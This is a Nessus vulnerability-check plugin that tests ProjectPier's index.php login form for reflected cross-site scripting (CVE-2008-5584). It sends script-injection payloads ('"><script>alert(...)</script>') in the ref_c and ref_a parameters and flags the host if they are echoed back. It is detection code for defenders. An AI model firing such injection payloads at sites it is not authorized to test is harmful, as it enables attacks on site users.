#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(31117);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2008-5584");
  script_bugtraq_id(27857);
  script_xref(name:"OSVDB", value:"42376");

  script_name(english:"ProjectPier index.php Multiple Parameter XSS");
  script_summary(english:"Tries to inject script code into login form");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
cross-site scripting vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running ProjectPier, an open-source project
management tool written in PHP. 

The version of ProjectPier installed on the remote host fails to
sanitize user input to the 'ref_c' and 'ref_a' parameters of the
'index.php' script before using it to generate dynamic HTML output. 
An unauthenticated attacker can exploit this to inject arbitrary HTML
and script code into a user's browser to be executed within the
security context of the affected site. 

Note that there are also reportedly several other vulnerabilities
associated with this version of ProjectPier, although Nessus has not
checked for them." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/488294" );
 script_set_attribute(attribute:"see_also", value:"http://www.projectpier.org/node/679" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ProjectPier 0.8.0.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


exploit1 = string('nessus"><script>alert(', rand(), ')</script>');
exploit2 = string(SCRIPT_NAME, '"><script>alert(', rand(), ')</script>');


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/projectpier", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Inject some script code.
  r = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "c=access&",
      "a=login&",
      "ref_c=", urlencode(str:exploit1), "&",
      "ref_a=", urlencode(str:exploit2)
    ),
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we see our exploits in the form.
  if (
    string('login[ref_c]" value="', exploit1, '"') >< res ||
    string('login[ref_a]" value="', exploit2, '"') >< res
  )
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
